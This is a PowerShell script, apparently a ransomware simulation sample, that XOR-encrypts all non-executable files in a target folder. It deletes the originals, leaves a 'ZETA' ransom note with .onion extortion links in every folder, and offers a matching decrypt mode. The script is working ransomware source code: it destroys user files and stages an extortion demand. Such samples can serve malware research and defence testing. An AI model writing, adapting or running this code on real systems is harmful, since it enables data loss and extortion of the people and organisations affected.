# (-Mode encrypt) (-Mode decrypt)
# set target folder and key file path

param (
    [string]$Mode,  # Accepts "-encrypt" or "-decrypt"
    [string]$TargetFolder = "C:\Usersr",  # Change to target folder
    [string]$KeyFile = "C:\Users\sample\encryption.key"  # Location of the XOR key
)

# Check for valid mode
if ($Mode -ne "encrypt" -and $Mode -ne "decrypt") {
    Write-Host "Invalid mode! Use -encrypt or -decrypt." -ForegroundColor Red
    exit
}

# XOR Encryption Function
function XOR-Encrypt {
    param ([string]$FilePath, [byte[]]$XORKey)

    $FileContent = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedData = [byte[]]::new($FileContent.Length)

    for ($i = 0; $i -lt $FileContent.Length; $i++) {
        $EncryptedData[$i] = $FileContent[$i] -bxor $XORKey[$i % $XORKey.Length]
    }

    # Save encrypted file with ".ZETA" extension
    [System.IO.File]::WriteAllBytes("$FilePath.ZETA", $EncryptedData)
    Remove-Item $FilePath -Force  # Delete original file
    Write-Host "Encrypted: $FilePath -> $FilePath.ZETA"
}

# XOR Decryption Function
function XOR-Decrypt {
    param ([string]$EncryptedFilePath, [byte[]]$XORKey)

    try {
        $EncryptedData = [System.IO.File]::ReadAllBytes($EncryptedFilePath)
        $DecryptedData = [byte[]]::new($EncryptedData.Length)

        for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
            $DecryptedData[$i] = $EncryptedData[$i] -bxor $XORKey[$i % $XORKey.Length]
        }

        # Restore original filename by removing ".ZETA" extension
        $OriginalFilePath = $EncryptedFilePath -replace "\.ZETA$", ""
        [System.IO.File]::WriteAllBytes($OriginalFilePath, $DecryptedData)
        Remove-Item -Path $EncryptedFilePath -Force  # Delete encrypted file after decryption
        Write-Host "Decrypted: $EncryptedFilePath -> $OriginalFilePath"
    } catch {
        Write-Host "Failed to decrypt: $EncryptedFilePath - $_"
    }
}

# Function to Add Ransom Note
function Add-RansomNote {
    param ([string]$FolderPath)

    $RansomNote = @"
We are the ZETA.

Your company Servers are locked and Data has been taken to our servers. This is serious.

Good news:
- your server system and data will be restored by our Decryption Tool, we support trial decryption to prove that your files can be decrypted;
- for now, your data is secured and safely stored on our server;
- nobody in the world is aware about the data leak from your company except you and ZETA team;
- we provide free trial decryption for files smaller than 1MB.

FAQs:
Who we are?
- Normal Browser Links: https://samplezetaras.onion.ly/
- Tor Browser Links: http://smplezetaqzeta.onion/

Think you can decrypt files yourself? Don't even try.

So lets get straight to the point.

What do we offer in exchange on your payment:
- decryption and restoration of all your systems and data within 24 hours with guarantee;
- never inform anyone about the data breach;
- after decryption, we delete all your data from our servers forever.

Now, in order to start negotiations, you need to:
- install and run 'Tor Browser' from https://www.torproject.org/download/
- use 'Tor Browser' open http://zetaqoin2zhzmsh4fr5zeta.onion/
- enter your Client ID: 79abdetestrandom29250

There will be no bad news after successful negotiations. But if you refuse, your business will suffer.

************************************************
"@

    $NotePath = Join-Path -Path $FolderPath -ChildPath "ZETA_readme.txt"
    if (-Not (Test-Path $NotePath)) {
        Set-Content -Path $NotePath -Value $RansomNote
        Write-Host "Ransom note added: $NotePath"
    }
}

# Check if folder exists
if (-Not (Test-Path $TargetFolder)) {
    Write-Host "Target folder does not exist! Exiting..." -ForegroundColor Red
    exit
}

# Encryption Mode
if ($Mode -eq "encrypt") {
    # Generate a random XOR key (16 bytes) and save it
    $XORKey = (1..16 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
    $KeyString = ($XORKey -join ",")
    Set-Content -Path $KeyFile -Value $KeyString  
    Write-Host "Encryption key saved to $KeyFile"

    # Encrypt all files (excluding .exe) and add ransom note
    $Files = Get-ChildItem -Path $TargetFolder -File -Recurse | Where-Object { $_.Extension -ne ".exe" }
    $Folders = Get-ChildItem -Path $TargetFolder -Directory -Recurse

    foreach ($File in $Files) {
        XOR-Encrypt -FilePath $File.FullName -XORKey $XORKey
    }

    foreach ($Folder in $Folders) {
        Add-RansomNote -FolderPath $Folder.FullName
    }

    Add-RansomNote -FolderPath $TargetFolder  # Add ransom note to root folder
    Write-Host "Encryption complete. All files encrypted."

}

# Decryption Mode
elseif ($Mode -eq "decrypt") {
    # Check if the key file exists
    if (-Not (Test-Path $KeyFile)) {
        Write-Host "Encryption key file not found! Decryption is impossible." -ForegroundColor Red
        exit
    }

    # Load the XOR key from the file
    $KeyString = Get-Content -Path $KeyFile
    $XORKey = $KeyString -split "," | ForEach-Object { [byte]$_ }
    Write-Host "Encryption key loaded from $KeyFile"

    # Decrypt all .ZETA files recursively
    $EncryptedFiles = Get-ChildItem -Path $TargetFolder -File -Recurse | Where-Object { $_.Extension -eq ".ZETA" }

    foreach ($File in $EncryptedFiles) {
        XOR-Decrypt -EncryptedFilePath $File.FullName -XORKey $XORKey
    }

    Write-Host "Decryption complete. All files restored."
}
